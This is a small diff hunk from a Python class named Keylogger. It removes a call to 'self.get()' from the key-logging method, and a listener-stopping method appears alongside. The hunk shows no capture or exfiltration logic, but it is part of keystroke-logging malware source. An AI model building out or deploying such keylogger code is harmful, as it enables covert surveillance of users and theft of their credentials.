@@ -27,7 +27,6 @@ class Keylogger:
 
     def log(self, key):
         self.key = key
-        self.get()
 
     def stop(self):
         self.listener.stop()
